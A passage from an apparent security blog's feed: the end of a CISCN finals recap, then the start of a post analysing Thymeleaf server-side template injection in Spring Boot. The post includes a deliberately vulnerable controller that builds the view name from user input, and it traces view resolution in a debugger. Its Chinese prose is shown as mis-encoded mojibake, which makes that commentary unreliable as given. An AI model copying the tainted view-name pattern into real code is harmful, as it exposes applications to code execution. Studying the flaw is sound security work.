æ˜¯å¤§å®¶åœ¨æ‹¼å°½å…¨åŠ›ä¹‹ååˆ°è¾¾çš„ï¼Œtqlå„ä½</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721750363736.jpg" alt="1721750363736"></p><p>å¥½äº†ï¼Œä¸¤å¤©çš„985æ¢¦ç»“æŸäº†ï¼Œå½’æ¥ä¾æ—§æ˜¯é‚£ä¸ªè‡­åŒéï¼ˆ</p><p>æ™šå®´ï¼Œèœæ˜¯ä¸€ç›˜æ¥ä¸€ç›˜çš„ä¸Šï¼Œçº¢ä¸æ‹‰å‡ çš„ï¼Œä¸è¿‡è¿˜æ˜¯åƒäº†ä¸å°‘æ‰å›å»ï¼Œyysyå·å‰§å˜è„¸å’Œå–·ç«å¾ˆå¥½çœ‹ï¼Œæ™šå®´çš„æŠ½å¥–ä¹Ÿæ˜¯è¢«æŒ–å‡ºé‰´æƒ0dayäº†ï¼ˆ</p><h2 id="åæ—¥è°ˆ"><a href="#åæ—¥è°ˆ" class="headerlink" title="åæ—¥è°ˆ"></a>åæ—¥è°ˆ</h2><p>å›åˆ°é…’åº—è¿˜æ˜¯ç¡è§‰ï¼Œé†’æ¥ä¹Ÿæ˜¯æ…¢æ‚ æ‚ çš„æ•´ç†ä¸œè¥¿ï¼Œä»”ç»†ä¸€æƒ³æˆ‘å¥½åƒé™¤äº†æ¯”èµ›æ ¹æœ¬æ²¡å‡ºè¿‡é—¨ï¼æœ‰ç‚¹åæ‚”ç»“æŸåçš„ç¬¬äºŒå¤©æ—©ä¸Šæ²¡è·Ÿç€Laffeyå»å±•å­ç©äº†ï¼ˆæˆ‘å˜ä¸ªæ¼«å±•ç‰¹ç§å…µ</p><p>ç„¶ååœ¨åºŠä¸Šç˜«äº†ä¸€æ—©ä¸Šbelike</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721751089662.jpg" alt="1721751089662"></p><p>å›å»çš„é£æœºä¸Šä¾æ—§æ˜¯çœ‹ç•ªåº¦è¿‡çš„</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721751277252.jpg" alt="1721751277252"></p><p>åˆ«åœ¨è¿™é‡Œå‘ç”µ.jpg</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721751277246.jpg" alt="1721751277246"></p><p>å¯çˆ±æ</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;2024.7.20-21	æˆéƒ½&lt;/p&gt;
&lt;p&gt;NISA-WhySerious	ä½37	å…¨å›½äºŒç­‰å¥–&lt;/p&gt;</summary>
    
    
    
    <category term="çº¿ä¸‹èµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    
    
    <category term="Nodejs" scheme="http://c1oudfl0w0.github.io/blog/tags/Nodejs/"/>
    
    <category term="SSTI" scheme="http://c1oudfl0w0.github.io/blog/tags/SSTI/"/>
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="å†…ç½‘" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="æ²™ç®±é€ƒé€¸" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
    <category term="jwt" scheme="http://c1oudfl0w0.github.io/blog/tags/jwt/"/>
    
  </entry>
  
  <entry>
    <title>Thymeleaf SSTI</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/10/Thymeleaf-SSTI/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/10/Thymeleaf-SSTI/</id>
    <published>2024-07-09T16:29:06.000Z</published>
    <updated>2024-07-11T07:27:01.102Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¶çƒ­æ‰“é“ï¼Œæ˜¨å¤©åˆšå­¦å®Œthymeleafå¼•æ“ä»Šå¤©ç›´æ¥ä¸Šæ³¨å…¥</p><p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/t/10514">https://xz.aliyun.com/t/10514</a></p><p><a href="https://www.anquanke.com/post/id/254519">https://www.anquanke.com/post/id/254519</a></p><p><a href="https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/">https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/</a></p><p><a href="https://www.cnpanda.net/sec/1063.html">https://www.cnpanda.net/sec/1063.html</a></p><span id="more"></span><p>ä»¥è¿™ä¸ªé¡¹ç›®è¿›è¡Œæ¼æ´å¤ç°ï¼š<a href="https://github.com/veracode-research/spring-view-manipulation">https://github.com/veracode-research/spring-view-manipulation</a></p><p>ç¯å¢ƒjdk1.8 + springboot 2.2.0 +thymeleaf 3.0.11</p><hr><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><h2 id="ç›¸å…³è¯­æ³•"><a href="#ç›¸å…³è¯­æ³•" class="headerlink" title="ç›¸å…³è¯­æ³•"></a>ç›¸å…³è¯­æ³•</h2><p>åœ¨<strong>Thymeleaf 3.x ç‰ˆæœ¬</strong>åï¼Œæ–°å¢äº†<code>~&#123;...&#125;</code>ç‰‡æ®µè¡¨è¾¾å¼ï¼Œè€Œå‡ºç°SSTIé—®é¢˜çš„ä¸»è¦åŸå› ä¹Ÿåœ¨äºæ­¤</p><p>å¤ä¹ ä¸€ä¸‹è¯­æ³•ï¼š</p><p><code>~&#123;templatename::selector&#125;</code>**ï¼Œä¼šåœ¨<code>/WEB-INF/templates/</code>ç›®å½•ä¸‹å¯»æ‰¾åä¸º<code>templatename</code>çš„æ¨¡ç‰ˆä¸­å®šä¹‰çš„<code>fragment</code></p><p>å¦‚æœ‰ä¸€ä¸ª html æ–‡ä»¶çš„ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>fragment</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>banquan<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2021 ThreeDream yyds<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶ååœ¨å¦ä¸€templateä¸­å¯ä»¥é€šè¿‡ç‰‡æ®µè¡¨è¾¾å¼å¼•ç”¨è¯¥ç‰‡æ®µï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>insert</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>~&#123;footer :: banquan&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>th:insert</code>å’Œ<code>th:replace</code>æ’å…¥ç‰‡æ®µæ˜¯æ¯”è¾ƒå¸¸è§çš„ç”¨æ³•</p><ul><li><code>~&#123;templatename&#125;</code>**ï¼šå¼•ç”¨æ•´ä¸ª<code>templatename</code>æ¨¡ç‰ˆæ–‡ä»¶ä½œä¸º<code>fragment</code></li><li><code>~&#123;::selector&#125;</code> æˆ– <code>~&#123;this::selector&#125;</code>**ï¼šå¼•ç”¨æ¥è‡ªåŒä¸€æ¨¡ç‰ˆæ–‡ä»¶åä¸º<code>selector</code>çš„<code>fragmnt</code>ã€‚åœ¨è¿™é‡Œï¼Œ<code>selector</code>å¯ä»¥æ˜¯é€šè¿‡<code>th:fragment</code>å®šä¹‰çš„ç‰‡æ®µï¼Œä¹Ÿå¯ä»¥æ˜¯ç±»é€‰æ‹©å™¨ã€IDé€‰æ‹©å™¨ç­‰</li><li><strong>å½“<code>~&#123;&#125;</code>ç‰‡æ®µè¡¨è¾¾å¼ä¸­å‡ºç°<code>::</code>ï¼Œé‚£ä¹ˆ <code>::</code>åéœ€è¦æœ‰å€¼ï¼ˆä¹Ÿå°±æ˜¯<code>selector</code>ï¼‰</strong></li></ul><p>Thymeleafä¸­çš„<strong>é¢„å¤„ç†è¡¨è¾¾å¼</strong>ï¼š<code>__$&#123;expression&#125;__</code>ï¼Œå› ä¸ºé¢„å¤„ç†ä¹Ÿå¯ä»¥è§£ææ‰§è¡Œè¡¨è¾¾å¼ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ§åˆ¶é¢„å¤„ç†è¡¨è¾¾å¼çš„åœ°æ–¹ï¼Œè®©å…¶è§£ææ‰§è¡Œæˆ‘ä»¬çš„payloadå³å¯è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œ</p><br><p>ç°åœ¨åˆ‡å…¥æ­£é¢˜</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710173131353.png" alt="image-20240710173131353"></p><p>çœ‹è¿™é‡Œçš„&#x2F;pathè·¯ç”±ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">   <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> <span class="token string">"user/"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"/welcome"</span><span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹ä¸€çœ‹åªæ˜¯ä¸€ä¸ªè¯­è¨€é€‰æ‹©çš„å‚æ•°langï¼Œä½†æ˜¯è¿™é‡Œé‡‡ç”¨çš„æ˜¯ thymeleaf æ¨¡æ¿ï¼Œå°±å‡ºç°äº†é—®é¢˜</p><blockquote><p>åœ¨springboot + thymeleaf ä¸­ï¼Œå¦‚æœè§†å›¾åå¯æ§ï¼Œå°±ä¼šå¯¼è‡´æ¼æ´çš„äº§ç”Ÿã€‚å…¶ä¸»è¦åŸå› å°±æ˜¯åœ¨æ§åˆ¶å™¨ä¸­æ‰§è¡Œ return  åï¼ŒSpring ä¼šè‡ªåŠ¨è°ƒåº¦ Thymeleaf  å¼•æ“å¯»æ‰¾å¹¶æ¸²æŸ“æ¨¡æ¿ï¼Œåœ¨å¯»æ‰¾çš„è¿‡ç¨‹ä¸­ï¼Œä¼šå°†ä¼ å…¥çš„å‚æ•°å½“æˆSpELè¡¨è¾¾å¼æ‰§è¡Œï¼Œä»è€Œå¯¼è‡´äº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p></blockquote><p>è€Œè¿™é‡Œçš„è§†å›¾åï¼Œå°±æ˜¯langå‚æ•°ï¼Œå½“æˆ‘ä»¬ä¼ å…¥å‚æ•°å€¼ençš„æ—¶å€™ï¼Œä¼šæ­£å¸¸æ¸²æŸ“è¿™é‡Œçš„en&#x2F;welcome.html</p><br><p>æ¥ä¸‹æ¥è·Ÿä¸€ä¸‹è¿™ä¸ªè§†å›¾è§£æçš„è¿‡ç¨‹ï¼Œå…¶å®å¤§éƒ¨åˆ†éƒ½æ˜¯MVCå¯¹requestçš„å¤„ç†æµç¨‹ï¼Œåœ¨MVCä¸­æ˜¯DispatcherServletæ‹¦æˆªè¯·æ±‚å¹¶åˆ†å‘åˆ°Handlerå¤„ç†</p><h2 id="SpringMVC-è§†å›¾è§£æè¿‡ç¨‹åˆ†æ"><a href="#SpringMVC-è§†å›¾è§£æè¿‡ç¨‹åˆ†æ" class="headerlink" title="SpringMVC è§†å›¾è§£æè¿‡ç¨‹åˆ†æ"></a>SpringMVC è§†å›¾è§£æè¿‡ç¨‹åˆ†æ</h2><p>ä¸‹æ–­ç‚¹ç›´æ¥å®šä½åˆ°<code>DispatcherServlet#doDispatch</code>æ–¹æ³•ï¼ˆæ‰€æœ‰çš„requestå’Œresponseéƒ½ä¼šç»è¿‡è¯¥æ–¹æ³•ï¼‰</p><p>å¼€å§‹è°ƒè¯•ï¼Œä¼ å…¥<code>/path?lang=en</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710181149064.png" alt="image-20240710181149064"></p><p>é¦–å…ˆè·å–åˆ°äº†Handleræ¶ˆæ¯å¤„ç†ï¼Œä¹‹åè¿›å…¥<code>doDispatch</code>æ–¹æ³•çš„å®ç°ï¼Œè¿™é‡Œé‡ç‚¹æ³¨æ„ä¸‹ä¸‹é¢3ä¸ªæ–¹æ³•</p><ul><li><p><code>ha.handle()</code> ï¼Œè·å–ModelAndViewä¹Ÿå°±æ˜¯Controllerä¸­çš„returnå€¼</p></li><li><p><code>applyDefaultViewName()</code>ï¼Œå¯¹å½“å‰ModelAndViewåšåˆ¤æ–­ï¼Œå¦‚æœä¸ºnullåˆ™è¿›å…¥defalutViewNameéƒ¨åˆ†å¤„ç†ï¼Œå°†URI pathä½œä¸ºmavçš„å€¼</p></li><li><p><code>processDispatchResult()</code>ï¼Œå¤„ç†è§†å›¾å¹¶<strong>è§£ææ‰§è¡Œè¡¨è¾¾å¼</strong>ä»¥åŠæŠ›å‡ºå¼‚å¸¸å›æ˜¾éƒ¨åˆ†å¤„ç†</p></li></ul><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710181729565.png" alt="image-20240710181729565"></p><h3 id="å°è£…ModelAndViewå¯¹è±¡"><a href="#å°è£…ModelAndViewå¯¹è±¡" class="headerlink" title="å°è£…ModelAndViewå¯¹è±¡"></a>å°è£…ModelAndViewå¯¹è±¡</h3><p>å…ˆè·Ÿè¿›åˆ°<code>ha.handle()</code></p><p>è°ƒç”¨äº†&#x2F;org&#x2F;springframework&#x2F;web&#x2F;servlet&#x2F;mvc&#x2F;method&#x2F;AbstractHandlerMethodAdapter.class#handleInternal</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710182306729.png" alt="image-20240710182306729"></p><p>ç„¶åç»§ç»­è·Ÿï¼Œä¸€è·¯æ¥åˆ°è°ƒç”¨<code>invokeHandlerMethod</code>æ–¹æ³•ï¼Œè¿™é‡Œå°±æ˜¯ä½¿ç”¨Handlerå¤„ç†requestå¹¶è·å–ModelAndView</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710182557297.png" alt="image-20240710182557297"></p><p>è·Ÿè¿›<code>invokeHandlerMethod</code>åˆ°è°ƒç”¨<code>invokeAndHandle</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710182924461.png" alt="image-20240710182924461"></p><p>è·Ÿè¿›<code>invokeAndHandle</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710183221338.png" alt="image-20240710183221338"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œåšäº†å¦‚ä¸‹æ“ä½œï¼š</p><ul><li><p><code>invokeForRequest</code>ä¼šè°ƒç”¨Controlleråè·å–è¿”å›å€¼åˆ°<code>returnValue</code>ä¸­</p><p>è¿™é‡Œçš„controlleræ˜¯HelloController.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"user/"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"/welcome"</span><span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>åˆ¤æ–­<code>returnValue</code>æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœæ˜¯åˆ™ç»§ç»­åˆ¤æ–­<code>isRequestHandled</code>æ˜¯å¦ä¸º<code>True</code>ï¼Œéƒ½æ»¡è¶³çš„è¯è®¾ç½®<code>requestHandled</code>ä¸º<code>true</code></p></li><li><p>é€šè¿‡<code>handleReturnValue</code>æ ¹æ®è¿”å›å€¼çš„ç±»å‹å’Œè¿”å›å€¼å°†ä¸åŒçš„å±æ€§è®¾ç½®åˆ°<code>ModelAndViewContainer</code>ä¸­</p></li></ul><p>æ€»ç»“ä¸€ä¸‹ï¼Œå°±æ˜¯æ ¹æ®ç”¨æˆ·è¾“å…¥çš„urlï¼Œè°ƒç”¨ç›¸å…³çš„controllerï¼Œå¹¶å°†å…¶è¿”å›å€¼<code>returnValue</code>ï¼Œä½œä¸ºå¾…æŸ¥æ‰¾çš„æ¨¡æ¿æ–‡ä»¶åï¼Œç„¶åé€šè¿‡Thymeleafæ¨¡æ¿å¼•æ“å»æŸ¥æ‰¾ï¼Œå¹¶è¿”å›ç»™ç”¨æˆ·</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710183847319.png" alt="image-20240710183847319"></p><p>å¯ä»¥çœ‹åˆ°ç»è¿‡äº†<code>invokeForRequest</code>å¤„ç†åreturnçš„å­—ç¬¦ä¸²å’Œå‰åç¼€æ‹¼æ¥åœ¨äº†ä¸€èµ·ï¼Œç„¶ååœ¨templatesç›®å½•ä¸‹å¯»æ‰¾æ¨¡æ¿æ–‡ä»¶ï¼Œè¿™é‡Œæ‰¾çš„å°±æ˜¯<code>templates/user/en/welcome.html</code></p><p>æ¥ä¸‹æ¥è·Ÿåˆ°<code>handleReturnValue</code>æ–¹æ³•</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handleReturnValue</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Object</span> returnValue<span class="token punctuation">,</span> <span class="token class-name">MethodParameter</span> returnType<span class="token punctuation">,</span> <span class="token class-name">ModelAndViewContainer</span> mavContainer<span class="token punctuation">,</span> <span class="token class-name">NativeWebRequest</span> webRequest<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>       <span class="token comment">//è·å–handler</span>       <span class="token class-name">HandlerMethodReturnValueHandler</span> handler <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">selectHandler</span><span class="token punctuation">(</span>returnValue<span class="token punctuation">,</span> returnType<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>handler <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Unknown return value type: "</span> <span class="token operator">+</span> returnType<span class="token punctuation">.</span><span class="token function">getParameterType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>           <span class="token comment">//æ‰§è¡ŒhandleReturnValueæ“ä½œ</span>           handler<span class="token punctuation">.</span><span class="token function">handleReturnValue</span><span class="token punctuation">(</span>returnValue<span class="token punctuation">,</span> returnType<span class="token punctuation">,</span> mavContainer<span class="token punctuation">,</span> webRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè¿›<code>ViewNameMethodReturnValueHandler#handleReturnValue</code>ï¼š</p><ul><li>åˆ¤æ–­è¿”å›å€¼ç±»å‹æ˜¯å¦ä¸ºå­—ç¬¦å‹ï¼Œè®¾ç½®<code>mavContainer.viewName</code></li><li>åˆ¤æ–­è¿”å›å€¼æ˜¯å¦ä»¥<code>redirect:</code>å¼€å¤´ï¼Œå¦‚æœæ˜¯çš„è¯åˆ™è®¾ç½®é‡å®šå‘çš„å±æ€§</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handleReturnValue</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Object</span> returnValue<span class="token punctuation">,</span> <span class="token class-name">MethodParameter</span> returnType<span class="token punctuation">,</span> <span class="token class-name">ModelAndViewContainer</span> mavContainer<span class="token punctuation">,</span> <span class="token class-name">NativeWebRequest</span> webRequest<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>returnValue <span class="token keyword">instanceof</span> <span class="token class-name">CharSequence</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">String</span> viewName <span class="token operator">=</span> returnValue<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//è®¾ç½®è¿”å›å€¼ä¸ºviewName</span>           mavContainer<span class="token punctuation">.</span><span class="token function">setViewName</span><span class="token punctuation">(</span>viewName<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//åˆ¤æ–­æ˜¯å¦éœ€è¦é‡å®šå‘</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isRedirectViewName</span><span class="token punctuation">(</span>viewName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               mavContainer<span class="token punctuation">.</span><span class="token function">setRedirectModelScenario</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>returnValue <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnsupportedOperationException</span><span class="token punctuation">(</span><span class="token string">"Unexpected return type: "</span> <span class="token operator">+</span> returnType<span class="token punctuation">.</span><span class="token function">getParameterType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" in method: "</span> <span class="token operator">+</span> returnType<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡ä¸Šé¢çš„æ“ä½œï¼Œå°†è¿”å›å€¼è®¾ç½®ä¸º<code>mavContainer.viewName</code></p><p>æ‰§è¡Œä¸Šè¿°æ“ä½œåè¿”å›åˆ°<code>RequestMappingHandlerAdapter#invokeHandlerMethod</code>ä¸­ã€‚é€šè¿‡<code>getModelAndView</code>è·å–<code>ModelAndView</code>å¯¹è±¡</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710185654740.png" alt="image-20240710185654740"></p><p><code>getModelAndView</code>æ ¹æ®<code>viewName</code>å’Œ<code>model</code>åˆ›å»º<code>ModelAndView</code>å¯¹è±¡å¹¶è¿”å›</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710185924354.png" alt="image-20240710185924354"></p><br><p>æ¥ä¸‹æ¥è·Ÿè¿›åˆ°<code>applyDefaultViewName</code>æ–¹æ³•</p><p>å¦‚æœ ModelAndView å€¼ä¸ä¸ºnullåˆ™ä»€ä¹ˆä¹Ÿä¸åšï¼Œå¦åˆ™å¦‚æœ<code>defaultViewName</code>å­˜åœ¨å€¼åˆ™ä¼šç»™ ModelAndView èµ‹å€¼ä¸º defaultViewNameï¼Œä¹Ÿå°±æ˜¯å°† URI path ä½œä¸ºè§†å›¾åç§°</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710193340699.png" alt="image-20240710193340699"></p><hr><h3 id="è·å–è§†å›¾"><a href="#è·å–è§†å›¾" class="headerlink" title="è·å–è§†å›¾"></a>è·å–è§†å›¾</h3><p>æ¥ä¸‹æ¥è·Ÿè¿›åˆ°<code>processDispatchResult</code>ï¼Œè·å–åˆ°<code>ModelAndView</code>å€¼åä¼šè¿›å…¥åˆ°<code>processDispatchResult</code>æ–¹æ³•</p><p>ç¬¬1ä¸ªifä¼šè¢«è·³è¿‡ï¼Œè·Ÿè¿›ç¬¬2ä¸ªifä¸­çš„<code>render</code>æ–¹æ³•</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710193725373.png" alt="image-20240710193725373"></p><p>åœ¨<code>render</code>æ–¹æ³•ä¸­ï¼Œé¦–å…ˆä¼šè°ƒç”¨<code>getViewName</code>æ¥è·å–mvå¯¹è±¡çš„<code>viewName</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710193923360.png" alt="image-20240710193923360"></p><p>ç„¶åè°ƒç”¨<code>resolveViewName</code>æ–¹æ³•</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710194219967.png" alt="image-20240710194219967"></p><p>å¾ªç¯éå†æ‰€æœ‰è§†å›¾è§£æå™¨è§£æè§†å›¾ï¼Œè§£ææˆåŠŸåˆ™è¿”å›ï¼Œå¯ä»¥çœ‹åˆ°å³ä¸‹è§’è¿™é‡Œæœ‰5ä¸ªè§†å›¾è§£æå™¨</p><p>æœ¬ä»¥ä¸ºä¼šåœ¨<code>ThymeleafViewResolver</code>ä¸­è·å–è§†å›¾ï¼Œå®é™…è°ƒè¯•å‘ç°è¿™é‡Œåœ¨<code>ContentNegotiatingViewResolver</code>ä¸­å°±å·²ç»è·å–åˆ°äº†è§†å›¾</p><blockquote><p><code>ContentNegotiatingViewResolver</code>è§†å›¾è§£æå™¨å…è®¸ä½¿ç”¨åŒæ ·çš„æ•°æ®è·å–ä¸åŒçš„Viewï¼Œæ”¯æŒä¸‰ç§æ–¹å¼ï¼š</p></blockquote><ol><li><p>ä½¿ç”¨æ‰©å±•åï¼š</p><p><a href="http://localhost:8080/employees/nego/Jack.xml">http://localhost:8080/employees/nego/Jack.xml</a><br>è¿”å›ç»“æœä¸ºXML<br><a href="http://localhost:8080/employees/nego/Jack.json">http://localhost:8080/employees/nego/Jack.json</a><br>è¿”å›ç»“æœä¸ºJSON<br><a href="http://localhost:8080/employees/nego/Jack">http://localhost:8080/employees/nego/Jack</a><br>ä½¿ç”¨é»˜è®¤viewå‘ˆç°ï¼Œæ¯”å¦‚JSP</p></li><li><p>HTTP Request Headerä¸­çš„Acceptï¼šAccept åˆ†åˆ«æ˜¯<code>text/jsp</code>ï¼Œ<code>text/pdf</code>ï¼Œ<code>text/xml</code>ï¼Œ<code>text/json</code>å’Œ<code>æ— Acceptè¯·æ±‚å¤´</code></p></li><li><p>ä½¿ç”¨å‚æ•°ï¼š</p><p><a href="http://localhost:8080/employees/nego/Jack?format=xml">http://localhost:8080/employees/nego/Jack?format=xml</a><br>è¿”å›ç»“æœä¸ºXML<br><a 